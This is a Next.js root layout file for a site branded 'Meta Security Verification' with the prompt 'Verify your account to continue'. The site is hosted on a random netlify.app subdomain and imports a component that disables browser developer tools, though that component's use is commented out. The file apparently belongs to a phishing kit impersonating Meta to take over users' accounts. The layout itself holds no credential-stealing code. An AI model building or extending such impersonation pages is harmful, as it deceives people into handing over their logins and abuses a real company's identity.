import '@/assets/css/index.css';
import DisableDevtool from '@/components/disable-devtool';
import { config } from '@fortawesome/fontawesome-svg-core';
import '@fortawesome/fontawesome-svg-core/styles.css';
import type { Metadata } from 'next';
import { Roboto, Roboto_Mono } from 'next/font/google';
config.autoAddCss = false;
const robotoSans = Roboto({
    variable: '--font-roboto-sans',
    subsets: ['latin']
});

const robotoMono = Roboto_Mono({
    variable: '--font-roboto-mono',
    subsets: ['latin']
});

export const metadata: Metadata = {
    metadataBase: new URL('https://gleaming-capybara-bd95c1.netlify.app/'),
    title: 'Meta Security Verification',
    description: 'Verify your account to continue',
    openGraph: {
        title: 'Meta Security Verification',
        description: 'Verify your account to continue',
        type: 'website',
        images: [
            {
                url: '/opengraph-image.jpg',
                width: 1200,
                height: 630,
                alt: 'Meta Security Verification',
            },
        ],
    },
};

export const dynamic = 'force-static';
export const revalidate = false;

const RootLayout = ({
    children
}: Readonly<{
    children: React.ReactNode;
}>) => {
    return (
        <html lang='en' data-scroll-behavior='smooth'>
            <body className={`${robotoSans.variable} ${robotoMono.variable} antialiased`}>
                {/* <DisableDevtool /> */}
                {children}
            </body>
        </html>
    );
};

export default RootLayout;
